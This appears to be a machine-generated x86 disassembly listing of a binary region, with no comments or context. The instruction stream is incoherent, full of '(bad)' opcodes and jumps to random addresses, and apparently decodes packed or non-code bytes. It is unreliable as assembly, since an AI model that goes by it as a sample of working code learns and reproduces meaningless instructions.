  416e45:	add    BYTE PTR [esi],bl
  416e47:	pop    es
  416e48:	add    BYTE PTR [eax],al
  416e4a:	test   al,0xe8
  416e4c:	mov    esi,0x661043b
  416e51:	mov    dh,0x98
  416e53:	aam    0x5b
  416e55:	and    al,dh
  416e57:	(bad)  
  416e58:	shr    BYTE PTR [eax-0x16],cl
  416e5b:	xchg   esi,eax
  416e5c:	jo     0x416de8
  416e5e:	popf   
  416e5f:	push   edi
  416e60:	stos   DWORD PTR es:[edi],eax
  416e61:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  416e63:	(bad)  
  416e65:	pop    esi
  416e66:	mov    edx,0x9d7c1872
  416e6b:	rol    edx,0xe6
  416e6e:	cs icebp 
  416e70:	out    0x63,al
  416e72:	js     0x416e11
  416e74:	dec    ebp
  416e75:	cmp    DWORD PTR [ecx+0x4e],eax
  416e78:	mov    cs,ebp
  416e7a:	lods   al,BYTE PTR ds:[esi]
  416e7b:	and    eax,0x6bca15ca
  416e80:	les    ecx,FWORD PTR [eax+0x4ebeb5c2]
  416e86:	mov    eax,0x974df61
  416e8b:	and    bh,BYTE PTR [eax]
  416e8d:	jno    0x416e7c
  416e8f:	jecxz  0x416ea9
  416e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e92:	outs   dx,BYTE PTR ds:[esi]
  416e93:	add    ecx,ebx
  416e95:	ror    BYTE PTR [eax-0x6bd86076],cl
  416e9b:	ret    
  416e9c:	jmp    0x416ebd
  416e9e:	or     eax,0x53eec377
  416ea3:	push   ecx
  416ea4:	pop    edx
  416ea5:	ja     0x416e80
  416ea7:	push   edx
  416ea8:	lods   al,BYTE PTR ds:[esi]
  416ea9:	add    edx,DWORD PTR [eax]
  416eab:	gs inc esp
  416ead:	in     al,0x92
  416eaf:	enter  0xd9e2,0xfa
  416eb3:	xor    ebp,esi
  416eb5:	je     0x416e58
  416eb7:	dec    edi
  416eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb9:	cmp    al,0x58
  416ebb:	jecxz  0x416e9a
  416ebd:	das    
  416ebe:	aam    0x7
  416ec0:	cmp    BYTE PTR [ebx-0x3fd2c4d0],cl
  416ec6:	out    0x48,eax
  416ec8:	test   eax,0xcb88c0b1
  416ecd:	fcomp  QWORD PTR [ebp-0x628bcbb2]
  416ed3:	xor    ch,0x3c
  416ed6:	stos   BYTE PTR es:[edi],al
  416ed7:	adc    esi,edi
  416ed9:	pop    esp
  416eda:	int3   
  416edb:	stc    
  416edc:	sub    eax,0x401f201c
  416ee1:	cdq    
  416ee2:	push   ss
  416ee3:	ret    0xd317
  416ee6:	xchg   edi,eax
  416ee7:	add    BYTE PTR [ebx+0x1288e05a],cl
  416eed:	icebp  
  416eee:	push   ecx
  416eef:	mov    ds:0x3060cb1d,al
  416ef4:	jle    0x416f33
  416ef6:	out    dx,al
  416ef7:	pop    ebp
  416ef8:	add    dl,bh
  416efa:	xor    al,0xad
  416efc:	push   cs
  416efd:	popf   
  416efe:	retf   0x2dc6
  416f01:	push   0xffffff94
  416f03:	mov    eax,0x6687850c
  416f08:	add    al,0x22
  416f0a:	adc    ecx,edi
  416f0c:	dec    esi
  416f0d:	mov    ch,0x54
  416f0f:	cmc    
  416f10:	sbb    al,0xea
  416f12:	pop    ss
  416f13:	dec    ecx
  416f14:	jns    0x416f26
  416f16:	sti    
  416f17:	or     DWORD PTR [edx-0x69dd257a],0x48
  416f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f1f:	jmp    0xa5ddd3d7
  416f24:	xchg   eax,esi
  416f26:	test   BYTE PTR [esi-0x5a8213a0],ah
  416f2c:	sub    ecx,DWORD PTR [eax]
  416f2e:	gs sub edx,edx
  416f31:	add    eax,0x45223b46
  416f36:	pop    ss
  416f37:	in     eax,dx
  416f38:	call   0x2d5614d1
  416f3d:	and    al,0x14
  416f3f:	retf   0x1f05
  416f42:	mov    WORD PTR [edi],ds
  416f44:	pushf  
  416f45:	xchg   ecx,eax
  416f46:	std    
  416f47:	sub    al,0x71
  416f49:	leave  
  416f4a:	ror    BYTE PTR [edi-0x65d5e8db],cl
  416f50:	xor    eax,DWORD PTR [esi+0x306afb7e]
  416f56:	sbb    eax,0xe97d2f04
  416f5b:	ds (bad) 
  416f5d:	jle    0x416f2d
  416f5f:	mov    bl,0xe0
  416f61:	cdq    
  416f62:	jnp    0x416fbb
  416f64:	jbe    0x416f0b
  416f66:	mov    ebp,0x3bb7b332
  416f6b:	(bad)  
  416f6c:	cli    
  416f6d:	cmp    esp,ecx
  416f6f:	cli    
  416f70:	or     dh,0xd4
  416f73:	out    0x50,al
  416f75:	mov    ebx,DWORD PTR ds:0xad7a1eca
  416f7b:	mov    ecx,0x8cfb7707
  416f80:	mov    bl,0xc
  416f82:	mov    ch,0x74
  416f84:	adc    eax,0x88fbe809
  416f89:	xor    al,BYTE PTR [edi-0x43]
  416f8c:	push   ss
  416f8d:	(bad)  
  416f8e:	rcr    DWORD PTR [ecx-0x80],1
  416f91:	inc    edx
  416f92:	xchg   ebx,eax
  416f93:	dec    esi
  416f94:	int    0x60
  416f96:	xor    DWORD PTR [edi],esp
  416f98:	mov    WORD PTR [eax+ecx*1+0x8],ds
  416f9c:	push   0x45709b94
  416fa1:	test   al,0xce
  416fa3:	add    eax,0xa75e2c21
  416fa8:	jbe    0x416f50
  416faa:	jbe    0x416ffd
  416fac:	stos   BYTE PTR es:[edi],al
  416fad:	xchg   ebx,eax
  416fae:	or     al,0xae
  416fb0:	imul   esp,edi,0xf619fd5d
  416fb6:	daa    
  416fb7:	cwde   
  416fb8:	jecxz  0x416f69
  416fba:	cmp    BYTE PTR [eax+0x4084e94f],bh
  416fc0:	jp     0x416fe9
  416fc2:	pop    es
  416fc3:	push   es
  416fc4:	or     eax,0xd266115d
  416fc9:	es mov ch,0xc
  416fcc:	pop    edi
  416fcd:	xor    eax,0xa6d6594a
  416fd2:	arpl   WORD PTR [edx-0x372301ec],di
  416fd8:	stc    
  416fd9:	push   0x32b289ed
  416fde:	push   ebp
  416fdf:	xlat   BYTE PTR ds:[ebx]
  416fe0:	inc    eax
  416fe1:	(bad)  
  416fe2:	call   0x634686d0
  416fe7:	adc    BYTE PTR [edx],ah
  416fe9:	adc    dh,BYTE PTR [esi+0x38]
  416fec:	cmp    al,0xa4
  416fee:	or     dh,BYTE PTR [eax]
  416ff0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  416ff2:	sbb    al,0x54
  416ff4:	(bad)  
  416ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff6:	fnstenv [ebx-0x9f05fa4]
  416ffc:	call   0x1eb4:0x97055279
  417003:	xor    BYTE PTR ds:0x9871c4c,0x8b
  41700a:	push   bx
  41700c:	mov    al,0x71
  41700e:	sub    al,0xd8
  417010:	out    dx,eax
  417011:	cmp    DWORD PTR [edi+0x5e],0xffffff8a
  417015:	and    DWORD PTR [ebx],0x7e
  417018:	aam    0xbe
  41701a:	lds    ecx,FWORD PTR [ecx-0x14]
  41701d:	(bad)  
  41701f:	sar    DWORD PTR [edi+edx*1+0x66],cl
  417023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417024:	jmp    0x5d619103
  417029:	retf   
  41702a:	cmp    ebp,DWORD PTR [esi+0x713d525f]
  417030:	enter  0x675f,0xe5
  417034:	mov    edx,?
  417036:	cwde   
  417037:	or     al,0x16
  417039:	iret   
  41703a:	inc    eax
  41703b:	and    al,0x71
  41703d:	jmp    0xcc3b5044
  417042:	sbb    eax,0xbdd876cd
  417047:	push   ebx
  417048:	add    BYTE PTR [esi-0x3e],bl
  41704b:	sbb    eax,0x452f2943
  417050:	push   edx
  417051:	mov    ah,0x64
  417053:	es int 0x7a
  417056:	mov    esi,0x83e1b838
  41705b:	cmp    edi,esi
  41705d:	ins    DWORD PTR es:[edi],dx
  41705e:	inc    ecx
  41705f:	cmp    BYTE PTR [eax],bh
  417061:	adc    DWORD PTR [ebp-0xa],esp
  417064:	(bad)  
  417065:	ficom  WORD PTR [edx]
  417067:	stos   DWORD PTR es:[edi],eax
  417068:	dec    edx
  417069:	jb     0x417021
  41706b:	dec    BYTE PTR [eax+0x4e395505]
  417071:	stos   BYTE PTR es:[edi],al
  417072:	neg    al
  417074:	and    DWORD PTR [edi+ebp*2+0x42],ecx
  417078:	adc    al,0x3b
  41707a:	icebp  
  41707b:	or     eax,0x762a1da2
  417080:	xchg   ebp,eax
  417081:	popf   
  417082:	mov    DWORD PTR [esi],ecx
  417084:	call   0xec8d:0xeac60908
  41708b:	das    
  41708c:	inc    edx
  41708d:	fcom   st(2)
  41708f:	pop    ebp
  417090:	pusha  
  417091:	inc    edi
  417092:	or     ebx,DWORD PTR [edx+0x3a]
  417095:	lock sub al,0x11
  417098:	mov    ebx,0x5a55af8a
  41709d:	jge    0x4170fa
  41709f:	(bad)  ds:0xbaed1177
  4170a5:	push   edi
  4170a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170a7:	je     0x4170af
  4170a9:	sbb    al,dh
  4170ab:	or     DWORD PTR [edi],0xffffffdd
  4170ae:	pop    edi
  4170af:	inc    edi
  4170b0:	add    DWORD PTR [ecx],esi
  4170b2:	mov    bl,bh
  4170b4:	inc    edx
  4170b5:	leave  
  4170b6:	mov    eax,0xae97bfa
  4170bb:	jle    0x41703f
  4170bd:	inc    eax
  4170be:	(bad)  
  4170c1:	push   DWORD PTR [edi-0x7efe27dc]
  4170c7:	frstor [edi+0x18]
  4170ca:	dec    eax
  4170cb:	outs   dx,DWORD PTR ds:[esi]
  4170cc:	add    eax,DWORD PTR [edx]
  4170ce:	inc    esi
  4170cf:	pop    ebx
  4170d0:	dec    esi
  4170d1:	(bad)  
  4170d2:	outs   dx,BYTE PTR ds:[esi]
  4170d3:	aam    0xb3
  4170d5:	sti    
  4170d6:	cdq    
  4170d7:	fwait
  4170d8:	push   0x72df78d9
  4170dd:	gs mov esp,eax
  4170e0:	fwait
  4170e1:	mov    bl,BYTE PTR [esi-0x3f]
  4170e4:	repnz add DWORD PTR [edx+0x28],ecx
  4170e8:	stc    
  4170e9:	daa    
  4170ea:	push   edi
  4170eb:	xor    eax,0x203a1b6e
  4170f0:	(bad)  
  4170f1:	mov    esp,0xbf82b948
  4170f6:	data16 jle 0x4170e4
  4170f9:	std    
  4170fa:	ficomp WORD PTR [ebp+0x4a3bbc5e]
  417100:	mov    eax,ds:0xb3c94e0
  417105:	xor    al,0x30
  417107:	je     0x417104
  417109:	push   ebx
  41710a:	in     al,0x48
  41710c:	mov    ebx,0x402d98b2
  417111:	pop    edx
  417112:	mov    dl,0xc4
  417114:	dec    ebp
  417115:	adc    BYTE PTR [esp+esi*8],dl
  417118:	cdq    
  417119:	xchg   edi,eax
  41711a:	cmc    
  41711b:	aas    
  41711c:	xchg   DWORD PTR [ebp+0x3f],ebp
  41711f:	sar    DWORD PTR [ebx+0xd3d1270],0xe4
  417126:	into   
  417127:	adc    BYTE PTR ds:0x3e7ebee2,ah
  41712d:	cs (bad) 
  41712f:	mov    dh,BYTE PTR [ebx+esi*8]
  417132:	jg     0x417142
  417134:	add    edx,edi
  417136:	loope  0x4171ae
  417138:	xchg   edi,eax
  417139:	lods   eax,DWORD PTR ds:[esi]
  41713a:	iret   
  41713b:	std    
  41713c:	or     al,0xb1
  41713e:	cmp    al,BYTE PTR [esi+ecx*1+0x44]
  417142:	push   0x8da1ab97
  417147:	pop    edi
  417148:	mov    dh,0xa3
  41714a:	add    eax,0x647ae7dc
  41714f:	lods   eax,DWORD PTR ds:[esi]
  417150:	push   edx
  417151:	pop    ecx
  417152:	stc    
  417153:	and    eax,0x25277f4d
  417158:	nop
  417159:	dec    edi
  41715a:	pop    eax
  41715b:	mov    bh,0x93
  41715d:	dec    eax
  41715e:	xor    eax,0x8c2ce6f4
  417163:	(bad)
  417166:	add    BYTE PTR [esi+0x2118046a],al
  41716c:	(bad)  
  41716d:	jle    0x4171ac
  41716f:	dec    esp
  417170:	and    al,BYTE PTR [edx]
  417172:	sub    esi,eax
  417174:	ret    
  417175:	jns    0x4171d9
  417177:	mov    edi,0x9c66e32f
  41717c:	ins    DWORD PTR es:[edi],dx
  41717d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41717e:	adc    eax,0x32ed4480
  417183:	lods   al,BYTE PTR ds:[esi]
  417184:	and    bh,BYTE PTR [ebp+0x4f]
  417187:	in     al,0x74
  417189:	(bad)  
  41718a:	pushf  
  41718b:	aas    
  41718c:	test   BYTE PTR [edi+0x16],cl
  41718f:	sahf   
  417190:	jbe    0x41711e
  417192:	add    bh,BYTE PTR [ebp-0x59dd05cd]
  417198:	jecxz  0x417122
  41719a:	in     eax,dx
  41719b:	or     BYTE PTR [eax+edx*1-0x3436ef31],0x10
  4171a3:	lea    ebx,es:[eax-0x6c]
  4171a7:	jmp    FWORD PTR [ebp+0x44cbd153]
  4171ad:	dec    esp
  4171ae:	scas   eax,DWORD PTR es:[edi]
  4171af:	pop    es
  4171b0:	mov    bh,0xf7
  4171b2:	mov    edi,0x931f0cd4
  4171b7:	mov    cl,0x55
  4171b9:	mov    ebp,0x446be7e5
  4171be:	cli    
  4171bf:	push   esp
  4171c0:	ins    BYTE PTR es:[edi],dx
  4171c1:	cmp    DWORD PTR [ecx+0x3f816b26],edi
  4171c7:	or     al,0x9f
  4171c9:	(bad)  
  4171ca:	push   ds
  4171cb:	fwait
  4171cc:	imul   edx,DWORD PTR [esi+edx*8-0x1f],0x5c
  4171d1:	jmp    0x31d9:0x9d54a225
  4171d8:	jnp    0x41720e
  4171da:	push   0x4e3611fe
  4171df:	ficom  WORD PTR [esi-0x19bc3d72]
  4171e5:	sbb    BYTE PTR [edi],ah
  4171e7:	jbe    0x417222
  4171e9:	jne    0x41719c
  4171eb:	sar    BYTE PTR [eax+0x1e88318f],cl
  4171f1:	loop   0x417267
  4171f3:	inc    edx
  4171f4:	push   eax
  4171f5:	sub    al,0xe5
  4171f7:	stos   DWORD PTR es:[edi],eax
  4171f8:	test   DWORD PTR ds:0xbddf5366,0xcb97a6
  417202:	jp     0x4171b8
  417204:	fcmove st,st(6)
  417206:	shl    BYTE PTR [ebx+ecx*4],cl
  417209:	adc    ah,BYTE PTR [ecx]
  41720b:	mov    ch,BYTE PTR [eax+0x64]
  41720e:	fcomp  DWORD PTR cs:[ebp-0x25]
  417212:	jle    0x41722e
  417214:	and    eax,0x228bcef3
  417219:	aam    0xb
  41721b:	mov    ecx,0xea9ddcc6
  417220:	lahf   
  417221:	fs mov al,0x85
  417224:	imul   esi,DWORD PTR [eax+0x3a864d03],0xffffffd5
  41722b:	ins    DWORD PTR es:[edi],dx
  41722c:	mov    eax,0xaa29e48b
  417231:	add    BYTE PTR [esi-0x22],0x32
  417235:	es adc eax,edx
  417238:	lods   al,BYTE PTR ds:[esi]
  417239:	push   ds
  41723a:	pop    ds
  41723b:	lock or BYTE PTR [eax-0x26db663a],dh
  417242:	inc    esp
  417243:	inc    esp
  417244:	in     eax,dx
  417245:	icebp  
  417246:	adc    al,0xc8
  417248:	add    edi,DWORD PTR [edi+0x44d14b07]
  41724e:	xchg   edx,eax
  41724f:	and    esp,DWORD PTR [edx+0x26]
  417252:	jmp    0x6610661c
  417257:	fcmovnbe st,st(5)
  417259:	ret    
  41725a:	dec    ebp
  41725b:	pop    esi
  41725c:	cmp    eax,esp
  41725e:	jns    0x417278
  417260:	stos   BYTE PTR es:[edi],al
  417261:	mov    eax,ds:0x6766f3a2
  417266:	lods   eax,DWORD PTR ds:[esi]
  417267:	xchg   esp,eax
  417268:	pop    edi
  417269:	nop
  41726a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726b:	sub    ecx,esi
  41726d:	pop    edx
  41726e:	mov    ecx,es
  417270:	ss fwait
  417272:	(bad)  
  417273:	outs   dx,BYTE PTR ds:[esi]
  417274:	jmp    0x41723f
  417276:	jbe    0x417219
  417278:	and    bh,BYTE PTR [esi]
  41727a:	mov    dh,0xca
  41727c:	sbb    eax,0x3f4a0948
  417281:	jle    0x41724c
  417283:	or     DWORD PTR [ebp-0x63a5ebfd],esi
  417289:	cmp    eax,0xbaf0f1c6
  41728e:	icebp  
  41728f:	int    0xc
  417291:	jecxz  0x417271
  417293:	int3   
  417294:	fst    QWORD PTR [esi+esi*8-0x7639b5c8]
  41729b:	push   ebp
  41729c:	shl    BYTE PTR [edx],0xe8
  41729f:	mov    DWORD PTR [eax-0x63],ecx
  4172a2:	test   dl,0x50
  4172a5:	jne    0x417240
  4172a7:	ror    BYTE PTR [ebp+0x27a5cff9],0xc
  4172ae:	sub    al,0x16
  4172b0:	xor    ebp,DWORD PTR [ebx+eiz*2]
  4172b3:	div    DWORD PTR [edx+edx*8]
  4172b6:	hlt    
  4172b7:	pop    eax
  4172b8:	or     bl,0x95
  4172bb:	or     dl,BYTE PTR [edi]
  4172bd:	push   edi
  4172be:	xchg   BYTE PTR [edx+0x26],ah
  4172c1:	sbb    eax,0x80b807ec
  4172c6:	inc    ebp
  4172c7:	push   ebp
  4172c8:	stc    
  4172c9:	clc    
  4172ca:	shr    BYTE PTR [esi],1
  4172cc:	stos   DWORD PTR es:[edi],eax
  4172cd:	fdiv   DWORD PTR [ebp+eiz*4-0x15]
  4172d1:	lds    esp,FWORD PTR [edx+0x33417b73]
  4172d7:	out    dx,al
  4172d8:	hlt    
  4172d9:	int    0x2b
  4172db:	push   esp
  4172dc:	cmp    eax,0x9b0be507
  4172e1:	sbb    al,0xc4
  4172e3:	mov    esi,0x53a090f5
  4172e8:	pop    edi
  4172e9:	out    dx,eax
  4172ea:	inc    esi
  4172eb:	adc    eax,0xe09d5ef
  4172f0:	dec    esp
  4172f1:	push   edi
  4172f2:	xchg   esi,eax
  4172f3:	adc    DWORD PTR ds:0xab51bbc6,eax
  4172f9:	jo     0x41734b
  4172fb:	jecxz  0x4172de
  4172fd:	adc    eax,0x47173d61
  417302:	outs   dx,BYTE PTR ds:[esi]
  417303:	pop    ebx
  417304:	sbb    BYTE PTR [ebx+0x58],dh
  417307:	ret    
  417308:	dec    esi
  417309:	test   al,0xa3
  41730b:	gs xchg dl,cl
  41730e:	loope  0x4172d8
  417310:	fs test al,0x65
  417313:	mov    cl,0xaf
  417315:	cmp    edi,esi
  417317:	xor    eax,0xdeb7e29d
  41731c:	and    DWORD PTR [edx],ebp
  41731e:	pop    esp
  41731f:	mov    es,WORD PTR [edi-0x23085565]
  417325:	pop    ecx
  417326:	inc    esp
  417327:	lahf   
  417328:	push   cs
  417329:	mov    ebp,0x7c5bcfe9
  41732e:	mov    BYTE PTR [esi+0x7dee62d3],dl
  417334:	mov    esi,0x62416bf6
  417339:	mov    ah,bh
  41733b:	js     0x417350
  41733d:	lods   eax,DWORD PTR ds:[esi]
  41733e:	sub    DWORD PTR [ebx+0x57],ebp
  417341:	outs   dx,DWORD PTR ds:[esi]
  417342:	es (bad) 
  417345:	xchg   ecx,eax
  417346:	stc    
  417347:	bound  ebx,QWORD PTR ds:0x90a35382
  41734d:	cli    
  41734e:	xchg   BYTE PTR [edi+0x23fd36ac],cl
  417354:	sbb    ebx,edx
  417356:	shl    bh,0x8
  417359:	mov    dl,0xcd
  41735b:	jb     0x41738b
  41735d:	or     al,0xc2
  41735f:	or     al,0x8a
  417361:	stc    
  417362:	(bad)  
  417363:	mov    bl,0x5e
  417365:	fidivr DWORD PTR [edx-0x6991d01c]
  41736b:	repz add ecx,edi
  41736e:	add    esp,DWORD PTR [esi]
  417370:	scas   eax,DWORD PTR es:[edi]
  417371:	mov    BYTE PTR [esi-0x6f5c2317],al
  417377:	clc    
  417378:	enter  0xf024,0xce
  41737c:	xchg   edx,eax
  41737d:	or     BYTE PTR [eax],bl
  41737f:	push   ebp
  417380:	arpl   WORD PTR [edi+0xf],cx
  417383:	xchg   esp,eax
  417384:	xchg   BYTE PTR [edx],cl
  417386:	mov    ebp,edx
  417388:	inc    esp
  417389:	inc    eax
  41738a:	lock push cs
  41738c:	dec    edi
  41738d:	pause  
  41738f:	and    BYTE PTR [ecx-0x6fa26cf6],0x8d
  417396:	shr    BYTE PTR [ebx-0x59],cl
  417399:	jb     0x4173c9
  41739b:	inc    ebp
  41739c:	adc    eax,0xfef935f1
  4173a1:	aas    
  4173a2:	xchg   DWORD PTR [esi+0x47],eax
  4173a5:	jb     0x417377
  4173a7:	pop    eax
  4173a8:	adc    al,0xa4
  4173aa:	jge    0x4173ed
  4173ac:	daa    
  4173ad:	push   ebx
  4173ae:	ds dec eax
  4173b0:	cmp    BYTE PTR [eax-0x66],bh
  4173b3:	cmp    ebp,DWORD PTR [ebp+0x1]
  4173b6:	sti    
  4173b7:	pop    ds
  4173b8:	mov    ecx,0xb455fc17
  4173bd:	fidiv  WORD PTR [ecx+ebx*2]
  4173c0:	mov    ah,0x79
  4173c2:	mov    eax,esp
  4173c4:	ins    BYTE PTR es:[edi],dx
  4173c5:	pop    edi
  4173c6:	mov    ds:0x75fbc2b2,al
  4173cb:	in     al,dx
  4173cc:	iret   
  4173cd:	add    DWORD PTR [edi+eiz*4],esi
  4173d0:	and    BYTE PTR [ebx-0xac46afb],bh
  4173d6:	hlt    
  4173d7:	popf   
  4173d8:	(bad)  
  4173da:	ds popaw 
  4173dd:	xor    DWORD PTR [edx+0x66],ecx
  4173e0:	jnp    0x4173d9
  4173e2:	jns    0x4173f1
  4173e4:	sahf   
  4173e5:	inc    ecx
  4173e6:	add    bh,al
  4173e8:	sbb    ah,bl
  4173ea:	rep lods al,BYTE PTR ds:[esi]
  4173ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ed:	jbe    0x41736f
  4173ef:	add    edx,edi
  4173f1:	xchg   esp,eax
  4173f2:	xchg   BYTE PTR [edi],ah
  4173f4:	loope  0x41743e
  4173f6:	stc    
  4173f7:	xchg   ebx,eax
  4173f8:	mov    ds:0xd0fec0b8,eax
  4173fd:	fmulp  st(0),st
  4173ff:	or     al,BYTE PTR [edx+0x7c5532ae]
  417405:	mov    bl,0x34
  417407:	xchg   edx,eax
  417408:	aas    
  417409:	pop    esi
  41740a:	xchg   ecx,eax
  41740b:	in     al,dx
  41740c:	(bad)  
  41740d:	jg     0x417443
  41740f:	xlat   BYTE PTR gs:[ebx]
  417411:	cs scas al,BYTE PTR es:[edi]
  417413:	rcr    DWORD PTR [edi-0x1d],1
  417416:	cdq    
  417417:	xchg   esi,eax
  417418:	jne    0x4173f7
  41741a:	ins    BYTE PTR es:[edi],dx
  41741b:	inc    esp
  41741c:	aaa    
  41741d:	(bad)  
  41741e:	push   esp
  41741f:	gs xor ebp,ebx
  417422:	cmp    al,0xa5
  417424:	mov    ebx,gs
  417426:	sar    DWORD PTR [ebx+ecx*4],0xd5
  41742a:	add    eax,0x25e1d085
  41742f:	adc    cl,BYTE PTR [edx-0x56]
  417432:	xchg   ebx,eax
  417433:	push   cs
  417434:	outs   dx,BYTE PTR ds:[esi]
  417435:	inc    edi
  417436:	lods   al,BYTE PTR ds:[esi]
  417437:	(bad)  
  417438:	js     0x417411
  41743a:	dec    ebx
  41743b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41743c:	int3   
  41743d:	dec    ebx
  41743e:	aas    
  41743f:	xor    DWORD PTR [ecx-0x27884f8d],ecx
  417445:	or     DWORD PTR [edx+ebx*4-0x740db97a],ebp
  41744c:	sub    BYTE PTR [edi-0x2b],cl
  41744f:	popf   
  417450:	dec    ebx
  417451:	and    bh,al
  417453:	int3   
  417454:	nop
  417455:	es rcl ah,cl
  417458:	popf   
  417459:	ror    BYTE PTR [ecx-0x56b78ae2],0xdd
  417460:	fbld   TBYTE PTR [esi]
  417462:	xchg   ecx,eax
  417463:	gs push ecx
  417465:	sub    cl,BYTE PTR [ebx+ecx*8]
  417468:	xor    DWORD PTR [edx+0x30],ebp
  41746b:	push   DWORD PTR [ebp+0x11]
  41746e:	dec    esi
  41746f:	push   0xfbf46d42
  417474:	jg     0x41745c
  417476:	(bad)  
  417477:	aaa    
  417478:	jmp    0x4174b3
  41747a:	xchg   ebp,eax
  41747b:	ja     0x417470
  41747d:	ror    BYTE PTR ds:0xd3b4b0b5,0x19
  417484:	or     al,0x29
  417486:	ret    0x39a9
  417489:	dec    edx
  41748a:	lea    ecx,ds:0xbb7c4fa2
  417490:	popf   
  417491:	mov    esp,0xb60d97a2
  417496:	fisub  DWORD PTR [edx+ebp*2-0x73294cc9]
  41749d:	loope  0x417502
  41749f:	pop    es
  4174a0:	fidiv  DWORD PTR [edx+0x51a6c89a]
  4174a6:	mov    bh,0x6d
  4174a8:	addr16 inc eax
  4174aa:	(bad)  [edi-0x7b7608c7]
  4174b0:	or     al,0xed
  4174b2:	test   DWORD PTR ds:0xf615604e,edi
  4174b8:	(bad)  
  4174b9:	jns    0x417471
  4174bb:	fwait
  4174bc:	jmp    0x49fb48c6
  4174c1:	int    0xf3
  4174c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174c4:	daa    
  4174c5:	sbb    DWORD PTR [edx-0x62],edx
  4174c8:	xchg   esp,eax
  4174c9:	dec    esp
  4174ca:	push   ds
  4174cb:	xchg   edi,eax
  4174cc:	ss cmp al,0x9a
  4174cf:	sbb    ecx,DWORD PTR es:0x71ebbbfe
  4174d6:	inc    edx
  4174d7:	cli    
  4174d8:	xlat   BYTE PTR ds:[ebx]
  4174d9:	ss push ds
  4174db:	scas   eax,DWORD PTR es:[edi]
  4174dc:	fstp   TBYTE PTR [ebx-0x3a29e987]
  4174e2:	frstor [eax+0x142316bf]
  4174e8:	aas    
  4174e9:	mov    edi,0xd81b0d17
  4174ee:	sbb    eax,eax
  4174f0:	ds mov esp,0xb2936bfa
  4174f6:	and    eax,0xed960bd1
  4174fb:	xor    al,0xa8
  4174fd:	jmp    0xb3cf:0x246ae6bb
  417504:	adc    dh,BYTE PTR [eax+0x8]
  417507:	mov    ebx,0x46d9863
  41750c:	mov    al,0xe0
  41750e:	ror    BYTE PTR [eiz*2+0x6331f9e4],1
  417515:	jb     0x41754e
  417517:	inc    eax
  417518:	add    BYTE PTR [edx+0x24],cl
  41751b:	jno    0x4174b6
  41751d:	or     DWORD PTR [eax+eiz*2-0x7b],ebx
  417521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417522:	xchg   DWORD PTR cs:[ebx+0x73a63f9],ecx
  417529:	adc    dh,BYTE PTR es:[ebp+0x47862ec2]
  417530:	inc    esp
  417531:	xchg   ecx,eax
  417532:	push   edx
  417533:	ret    0x11e0
  417536:	lea    esi,[edi-0x34]
  417539:	jl     0x41756f
  41753b:	pop    edi
  41753c:	gs pop ds
  41753e:	adc    al,0x7e
  417540:	jae    0x417544
  417542:	pop    es
  417543:	leave  
  417544:	jmp    0x61130076
  417549:	dec    ebx
  41754a:	jge    0x417563
  41754c:	mov    esp,ecx
  41754e:	mov    eax,ecx
  417550:	jmp    0x4175b1
  417552:	stos   BYTE PTR es:[edi],al
  417553:	fld    DWORD PTR [ebx]
  417555:	fild   WORD PTR [edi]
  417557:	and    eax,0x940d1bca
  41755c:	sbb    edx,esp
  41755e:	ins    BYTE PTR es:[edi],dx
  41755f:	sub    ebp,edi
  417561:	int    0xbc
  417563:	and    bh,BYTE PTR [esi+0x242e12]
	...
  417739:	add    BYTE PTR [eax],al
  41773b:	add    BYTE PTR [ebx-0x62],ah
  41773e:	mov    esi,0xff63ff63
  417743:	sahf   
  417744:	and    eax,0x6c989286
  417749:	mov    bh,0x72
  41774b:	hlt    
  41774c:	mov    ecx,0x1e0001b6
  417751:	pop    es
  417752:	add    BYTE PTR [eax],al
  417754:	cmc    
  417755:	popf   
  417756:	jno    0x417795
  417758:	sti    
  417759:	ds cdq 
  41775b:	xchg   esi,eax
  41775c:	push   ebp
  41775d:	sub    BYTE PTR [ecx-0x2d82e92e],0x29
  417764:	dec    ebx
  417765:	enter  0x318d,0xad
  417769:	shl    BYTE PTR [ebp-0x496acb87],cl
  41776f:	addr16 pop esp
  417771:	gs mov ebx,0xab03550c
  417777:	xchg   edi,eax
  417778:	jg     0x417754
  41777a:	ins    DWORD PTR es:[edi],dx
  41777b:	push   ss
  41777c:	in     eax,dx
  41777d:	imul   ebx,esi,0xffffffde
  417780:	sub    ah,BYTE PTR [edi-0x49]
  417783:	push   esp
  417784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417785:	mov    al,ds:0xd3efd07a
  41778a:	and    eax,0x19f5ab94
  41778f:	mov    WORD PTR [esi+0x631933c4],ss
  417795:	fistp  WORD PTR [esi+0x331a09d0]
  41779b:	mov    al,0x69
  41779d:	jmp    0x7b3ffc70
  4177a2:	push   0x78
  4177a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a5:	fucomi st,st(4)
  4177a7:	cdq    
  4177a8:	(bad)  
  4177a9:	fsub   DWORD PTR [ebp-0x3a]
  4177ac:	push   0xdacac3cd
  4177b1:	inc    esp
  4177b2:	or     dl,BYTE PTR [ebx]
  4177b4:	lods   al,BYTE PTR ds:[esi]
  4177b5:	ret    
  4177b6:	push   ebx
  4177b7:	push   edx
  4177b8:	add    al,BYTE PTR [eax+0x468eab83]
  4177be:	mov    ebp,0x20b61c34
  4177c3:	or     al,0x8a
  4177c5:	lods   al,BYTE PTR ds:[esi]
  4177c6:	sub    eax,0x5bf01f76
  4177cb:	jb     0x4177dc
  4177cd:	jno    0x41777f
  4177cf:	pop    esp
  4177d0:	test   eax,0x58681a7d
  4177d5:	adc    al,0xfc
  4177d7:	mov    bl,0xe2
  4177d9:	mov    ebx,0x2903013b
